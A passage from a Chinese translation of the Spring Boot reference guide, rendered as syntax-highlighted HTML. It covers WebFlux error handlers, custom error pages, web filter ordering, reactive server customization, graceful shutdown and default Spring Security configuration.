<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ApplicationContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpStatus</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">MediaType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">ServerCodecConfigurer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RouterFunction</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RouterFunctions</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerResponse</span><span class="token punctuation">.</span><span class="token class-name">BodyBuilder</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyErrorWebExceptionHandler</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractErrorWebExceptionHandler</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">public</span> <span class="token class-name">MyErrorWebExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">ErrorAttributes</span> errorAttributes<span class="token punctuation">,</span> <span class="token class-name">WebProperties</span> webProperties<span class="token punctuation">,</span>
            <span class="token class-name">ApplicationContext</span> applicationContext<span class="token punctuation">,</span> <span class="token class-name">ServerCodecConfigurer</span> serverCodecConfigurer<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>errorAttributes<span class="token punctuation">,</span> webProperties<span class="token punctuation">.</span><span class="token function">getResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setMessageReaders</span><span class="token punctuation">(</span>serverCodecConfigurer<span class="token punctuation">.</span><span class="token function">getReaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setMessageWriters</span><span class="token punctuation">(</span>serverCodecConfigurer<span class="token punctuation">.</span><span class="token function">getWriters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token class-name">RouterFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ServerResponse</span><span class="token punctuation">&gt;</span></span> <span class="token function">getRoutingFunction</span><span class="token punctuation">(</span><span class="token class-name">ErrorAttributes</span> errorAttributes<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">RouterFunctions</span><span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token operator">::</span><span class="token function">acceptsXml</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token operator">::</span><span class="token function">handleErrorAsXml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">acceptsXml</span><span class="token punctuation">(</span><span class="token class-name">ServerRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> request<span class="token punctuation">.</span><span class="token function">headers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token class-name">MediaType</span><span class="token punctuation">.</span><span class="token constant">APPLICATION_XML</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Mono</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ServerResponse</span><span class="token punctuation">&gt;</span></span> <span class="token function">handleErrorAsXml</span><span class="token punctuation">(</span><span class="token class-name">ServerRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">BodyBuilder</span> builder <span class="token operator">=</span> <span class="token class-name">ServerResponse</span><span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">INTERNAL_SERVER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// ... additional builder calls</span>
        <span class="token keyword">return</span> builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>要想了解更全面的情况，还可以直接子类化 <code>DefaultErrorWebExceptionHandler</code> 并覆盖特定方法。<br> 在某些情况下，<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.metrics.supported.spring-webflux" rel="nofollow">度量基础设施</a>不会记录在控制器或处理程序函数级别处理的错误。应用程序可以通过将处理过的异常设置为请求属性，确保请求指标记录此类异常：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>error<span class="token punctuation">.</span></span><span class="token class-name">ErrorAttributes</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ExceptionHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>result<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">Rendering</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerWebExchange</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyExceptionHandlingController</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/profile"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Rendering</span> <span class="token function">userProfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// ...</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">IllegalStateException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Rendering</span> <span class="token function">handleIllegalState</span><span class="token punctuation">(</span><span class="token class-name">ServerWebExchange</span> exchange<span class="token punctuation">,</span> <span class="token class-name">IllegalStateException</span> exc<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        exchange<span class="token punctuation">.</span><span class="token function">getAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">putIfAbsent</span><span class="token punctuation">(</span><span class="token class-name">ErrorAttributes</span><span class="token punctuation">.</span><span class="token constant">ERROR_ATTRIBUTE</span><span class="token punctuation">,</span> exc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">Rendering</span><span class="token punctuation">.</span><span class="token function">view</span><span class="token punctuation">(</span><span class="token string">"errorView"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">modelAttribute</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> exc<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="_910"></a>自定义错误页面</h6> 
<p>如果要为给定的状态代码显示自定义 HTML 错误页面，可以添加从 <code>error/*</code> 解析的视图，例如向 <code>/error</code> 目录添加文件。错误页面既可以是静态 HTML（即添加到任何静态资源目录下），也可以使用模板构建。文件名应为准确的状态代码、状态代码系列掩码或默认的 error（如果没有其他匹配项）。请注意，默认错误视图的路径是 <code>error/error</code>，而 Spring MVC 的默认错误视图是 error。<br> 例如，要将 <code>404</code> 映射到静态 HTML 文件，目录结构如下：</p> 
<pre><code>src/
 +- main/
     +- java/
     |   + &lt;source code&gt;
     +- resources/
         +- public/
             +- error/
             |   +- 404.html
             +- &lt;other public assets&gt;
</code></pre> 
<p>要使用 Mustache 模板映射所有 <code>5xx</code> 错误，您的目录结构如下：</p> 
<pre><code>src/
 +- main/
     +- java/
     |   + &lt;source code&gt;
     +- resources/
         +- templates/
             +- error/
             |   +- 5xx.mustache
             +- &lt;other templates&gt;
</code></pre> 
<h5><a id="Web_Filters_936"></a>Web Filters</h5> 
<p>Spring WebFlux 提供了一个 <code>WebFilter</code> 接口，可用于过滤 HTTP 请求-响应交换。应用程序上下文中的 <code>WebFilter</code> Bean 将自动用于过滤每个交换。<br> 如果过滤器的顺序很重要，它们可以实现 <code>Ordered</code> 或使用 <code>@Order</code> 进行注解。Spring Boot 自动配置可能会为您配置网络过滤器。配置时，将使用下表所示的顺序：</p> 
<table><thead><tr><th><strong>Web Filter</strong></th><th><strong>Order</strong></th></tr></thead><tbody><tr><td><code>WebFilterChainProxy</code>(Spring Security)</td><td><code>-100</code></td></tr><tr><td><code>HttpExchangesWebFilter</code></td><td><code>Ordered.LOWEST_PRECEDENCE - 10</code></td></tr></tbody></table> 
<h4><a id="_945"></a>嵌入式反应式服务器支持</h4> 
<p>Spring Boot 支持以下嵌入式反应式 Web 服务器： Reactor Netty、Tomcat、Jetty 和 Undertow。大多数开发人员都会使用相应的 “Starter” 来获取一个完全配置好的实例。默认情况下，嵌入式服务器通过 <code>8080</code> 端口侦听 HTTP 请求。</p> 
<h5><a id="_947"></a>自定义反应式服务器</h5> 
<p>常见的反应式网络服务器设置可通过 Spring <code>Environment</code> 属性进行配置。通常，你会在 <code>application.properties</code> 或 <code>application.yaml</code> 文件中定义这些属性。<br> 常见的服务器设置包括</p> 
<ul><li>网络设置： 接收 HTTP 请求的监听端口（<code>server.port</code>）、绑定的接口地址（<code>server.address</code>）等。</li><li>错误管理： 错误页面的位置（<code>server.error.path</code>）等。</li><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/howto.html#howto.webserver.configure-ssl" rel="nofollow">SSL</a></li><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/howto.html#howto.webserver.enable-response-compression" rel="nofollow">HTTP compression</a></li></ul> 
<p>Spring Boot 尽可能公开通用设置，但这并不总是可能的。在这种情况下，专用命名空间（如 <code>server.netty.*</code>）可提供特定于服务器的自定义设置。</p> 
<blockquote> 
 <p>完整列表请参阅<a href="https://github.com/spring-projects/spring-boot/tree/v3.2.0/spring-boot-project/spring-boot-autoconfigure/src/main/java/org/springframework/boot/autoconfigure/web/ServerProperties.java">ServerProperties</a>类。</p> 
</blockquote> 
<h6><a id="_959"></a>程序自定义</h6> 
<p>如果需要以编程方式配置反应式 Web 服务器，可以注册一个实现 <code>WebServerFactoryCustomizer</code> 接口的 Spring Bean。<code>WebServerFactoryCustomizer</code> 提供了对 <code>ConfigurableReactiveWebServerFactory</code> 的访问，其中包含大量自定义设置方法。下面的示例展示了如何通过编程设置端口：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ConfigurableReactiveWebServerFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">WebServerFactoryCustomizer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyWebServerFactoryCustomizer</span> <span class="token keyword">implements</span> <span class="token class-name">WebServerFactoryCustomizer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ConfigurableReactiveWebServerFactory</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">customize</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableReactiveWebServerFactory</span> server<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        server<span class="token punctuation">.</span><span class="token function">setPort</span><span class="token punctuation">(</span><span class="token number">9000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p><code>JettyReactiveWebServerFactory</code>、<code>NettyReactiveWebServerFactory</code>、<code>TomcatReactiveWebServerFactory</code> 和 <code>UndertowReactiveWebServerFactory</code> 是 <code>ConfigurableReactiveWebServerFactory</code> 的专用变体，它们分别为 Jetty、Reactor Netty、Tomcat 和 Undertow 提供了额外的自定义设置方法。下面的示例展示了如何自定义 <code>NettyReactiveWebServerFactory</code>，使其能访问特定于 Reactor Netty 的配置选项：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">Duration</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>embedded<span class="token punctuation">.</span>netty<span class="token punctuation">.</span></span><span class="token class-name">NettyReactiveWebServerFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">WebServerFactoryCustomizer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyNettyWebServerFactoryCustomizer</span> <span class="token keyword">implements</span> <span class="token class-name">WebServerFactoryCustomizer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">NettyReactiveWebServerFactory</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">customize</span><span class="token punctuation">(</span><span class="token class-name">NettyReactiveWebServerFactory</span> factory<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        factory<span class="token punctuation">.</span><span class="token function">addServerCustomizers</span><span class="token punctuation">(</span><span class="token punctuation">(</span>server<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> server<span class="token punctuation">.</span><span class="token function">idleTimeout</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">ofSeconds</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="_ConfigurableReactiveWebServerFactory_994"></a>直接自定义 ConfigurableReactiveWebServerFactory</h6> 
<p>对于需要从 <code>ReactiveWebServerFactory</code> 扩展的高级用例，您可以自己公开一个此类 Bean。<br> 我们为许多配置选项提供了设置器。如果您需要做一些更特殊的事情，我们还提供了几个受保护的方法 “钩子”。详情请参见<a href="https://docs.spring.io/spring-boot/docs/3.2.0/api/org/springframework/boot/web/reactive/server/ConfigurableReactiveWebServerFactory.html" rel="nofollow">源代码文档</a>。</p> 
<blockquote> 
 <p>自动配置的自定义程序仍会应用于自定义工厂，因此请谨慎使用该选项。</p> 
</blockquote> 
<h4><a id="_999"></a>反应式服务器资源配置</h4> 
<p>在自动配置 Reactor Netty 或 Jetty 服务器时，Spring Boot 将创建特定的 Bean，为服务器实例提供 HTTP 资源： <code>ReactorResourceFactory</code> 或 <code>JettyResourceFactory</code>。<br> 默认情况下，这些资源也将与 Reactor Netty 和 Jetty 客户端共享，以获得最佳性能：</p> 
<ul><li>服务器和客户端使用相同的技术</li><li>客户端实例使用 Spring Boot 自动配置的 <code>WebClient.Builder</code> Bean 构建</li></ul> 
<p>开发人员可以通过提供自定义的 <code>ReactorResourceFactory</code> 或 <code>JettyResourceFactory</code> Bean 来覆盖 Jetty 和 Reactor Netty 的资源配置，这将同时应用于客户端和服务器。<br> 您可以在 <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/io.html#io.rest-client.webclient.runtime" rel="nofollow">WebClient Runtime 部分</a> 了解有关客户端资源配置的更多信息。</p> 
<h3><a id="_1008"></a>优雅关机</h3> 
<p>所有四种嵌入式网络服务器（Jetty、Reactor Netty、Tomcat 和 Undertow）以及基于反应和 servlet 的网络应用程序都支持优雅关机。它是关闭应用程序上下文的一部分，在停止 <code>SmartLifecycle</code> Bean 的最早阶段执行。这种停止处理使用一个超时时间，提供一个宽限期，在此期间允许完成现有请求，但不允许有新请求。不允许新请求的具体方式因所使用的网络服务器而异。Jetty、Reactor Netty 和 Tomcat 将在网络层停止接受请求。Undertow 会接受请求，但会立即作出服务不可用 (503) 的回应。</p> 
<blockquote> 
 <p>使用 Tomcat 优雅关机需要 Tomcat 9.0.33 或更高版本。</p> 
</blockquote> 
<p>要启用优雅关机，请配置 <code>server.shutdown</code> 属性，如下例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">shutdown</span><span class="token punctuation">:</span> <span class="token string">"graceful"</span>
</code></pre> 
<p>要配置超时时间，请配置 <code>spring.lifecycle.timeout-per-shutdown-phase</code> 属性，如下例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">lifecycle</span><span class="token punctuation">:</span>
    <span class="token key atrule">timeout-per-shutdown-phase</span><span class="token punctuation">:</span> <span class="token string">"20s"</span>
</code></pre> 
<p>如果集成开发环境没有发送正确的 <code>SIGTERM</code> 信号，那么在集成开发环境中使用优雅关机可能无法正常工作。详情请查看集成开发环境的文档。</p> 
<h3><a id="Spring_Security_1024"></a>Spring Security</h3> 
<p>如果 <a href="https://spring.io/projects/spring-security" rel="nofollow">Spring Security</a> 位于类路径上，那么网络应用程序默认是安全的。Spring Boot 依靠 Spring Security 的内容协商策略来决定是使用 <code>httpBasic</code> 还是 <code>formLogin</code>。要为网络应用程序添加方法级安全性，也可以添加 <code>@EnableGlobalMethodSecurity</code> 并进行所需设置。更多信息可参阅<a href="https://docs.spring.io/spring-security/reference/6.2/servlet/authorization/method-security.html" rel="nofollow">《Spring 安全性参考指南》</a>。<br> 默认的 <code>UserDetailsService</code> 只有一个用户。用户名是 <code>user</code>，密码是随机的，并在应用程序启动时打印在 WARN 级别，如下例所示：</p> 
<pre><code>Using generated security password: 78fa095d-3f4c-48b1-ad50-e24c31d5cf35

This generated password is for development use only. Your security configuration must be updated before running your application in production.
</code></pre> 
<p>如果微调日志记录配置，请确保 <code>org.springframework.boot.autoconfigure.security</code> 类别设置为记录 <code>WARN</code> 级消息。否则，将不会打印默认密码。<br> 您可以通过提供<code> spring.security.user.name</code> 和<code> spring.security.user.password</code> 来更改用户名和密码。<br> 网络应用程序默认的基本功能包括：</p> 
<ul><li>带有内存存储的 <code>UserDetailsService</code>（或 WebFlux 应用程序中的 <code>ReactiveUserDetailsService</code>）Bean，以及带有生成密码的单个用户（用户属性请参阅 <a href="https://docs.spring.io/spring-boot/docs/3.2.0/api/org/springframework/boot/autoconfigure/security/SecurityProperties.User.html" rel="nofollow">SecurityProperties.User</a>）。</li><li>整个应用程序的基于表单的登录或 HTTP Basic 安全性（取决于请求中的 <code>Accept</code> 标头）（包括执行器端点，如果执行器在类路径上）。</li><li>用于发布身份验证事件的 <code>DefaultAuthenticationEventPublisher</code>。</li></ul> 
<p>您可以通过添加一个 Bean 来提供不同的 <code>AuthenticationEventPublisher</code>。</p> 
<h4><a id="MVC_Security_1041"></a>MVC Security</h4> 
<p>默认安全配置在 <code>SecurityAutoConfiguration</code> 和 <code>UserDetailsServiceAutoConfiguration</code> 中实现。<code>SecurityAutoConfiguration</code> 为网络安全导入 <code>SpringBootWebSecurityConfiguration</code>，<code>UserDetailsServiceAutoConfiguration</code> 配置身份验证，这在非网络应用中也很重要。<br> 要完全关闭默认的网络应用程序安全配置，或将多个 Spring 安全组件（如 OAuth2 客户端和资源服务器）组合在一起，可添加一个 <code>SecurityFilterChain</code> 类型的 Bean（这样做不会禁用 <code>UserDetailsService</code> 配置或 Actuator 的安全性）。要关闭 <code>UserDetailsService</code> 配置，还可以添加一个 <code>UserDetailsService</code>、<code>AuthenticationProvider</code> 或 <code>AuthenticationManager</code> 类型的 Bean。<br> <code>UserDetailsService</code> 的自动配置还将关闭类路径上的以下任何 Spring Security 模块：</p> 
<ul><li><code>spring-security-oauth2-client</code></li><li><code>spring-security-oauth2-resource-server</code></li><li><code>spring-security-saml2-service-provider</code></li></ul> 
<p>要在一个或多个这些依赖项之外使用 <code>UserDetailsService</code>，请定义您自己的 <code>InMemoryUserDetailsManager</code> Bean。<br> 可以通过添加自定义 <code>SecurityFilterChain</code> Bean 来重写访问规则。Spring Boot 提供的便捷方法可用于重写执行器端点和静态资源的访问规则。<code>EndpointRequest</code> 可用于创建基于 <code>management.endpoints.web.base-path</code> 属性的 <code>RequestMatcher</code>。<code>PathRequest</code> 可用于为常用位置的资源创建 <code>RequestMatcher</code>。</p> 
<h4><a id="WebFlux_Security_1052"></a>WebFlux Security</h4> 
<p>与 Spring MVC 应用程序类似，您也可以通过添加 <code>spring-boot-starter-security</code> 依赖关系来确保 WebFlux 应用程序的安全。默认安全配置在 <code>ReactiveSecurityAutoConfiguration</code> 和 <code>UserDetailsServiceAutoConfiguration</code> 中实现。<code>ReactiveSecurityAutoConfiguration</code> 会导入 <code>WebFluxSecurityConfiguration</code> 以实现网络安全，而 <code>UserDetailsServiceAutoConfiguration</code> 则会配置身份验证，这在非网络应用程序中也很重要。<br> 要完全关闭默认的网络应用程序安全配置，可以添加一个 <code>WebFilterChainProxy</code> 类型的 Bean（这样做不会禁用 <code>UserDetailsService</code> 配置或 Actuator 的安全性）。要同时关闭 <code>UserDetailsService</code> 配置，可以添加一个 <code>ReactiveUserDetailsService</code> 或 <code>ReactiveAuthenticationManager</code> 类型的 Bean。<br> 当类路径上有以下任何一个 Spring Security 模块时，自动配置也将关闭：</p> 
<ul><li>spring-security-oauth2-client</li><li>spring-security-oauth2-resource-server</li></ul> 
<p>要在一个或多个这些依赖项之外使用 <code>ReactiveUserDetailsService</code>，请定义您自己的 <code>MapReactiveUserDetailsService</code> Bean。<br> 访问规则和多个 Spring Security 组件（如 OAuth 2 客户端和资源服务器）的使用可通过添加自定义 <code>SecurityWebFilterChain</code> Bean 进行配置。Spring Boot 提供的便捷方法可用于覆盖执行器端点和静态资源的访问规则。<code>EndpointRequest</code> 可用于创建基于 <code>management.endpoints.web.base-path</code> 属性的 <code>ServerWebExchangeMatcher</code>。<br> <code>PathRequest</code> 可用于为常用位置的资源创建 <code>ServerWebExchangeMatcher</code>。<br> 例如，你可以通过添加以下内容来定制你的安全配置：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>security<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span></span><span class="token class-name">PathRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerHttpSecurity</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">SecurityWebFilterChain</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">Customizer</span><span class="token punctuation">.</span><span class="token static">withDefaults</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyWebFluxSecurityConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Bean</span>
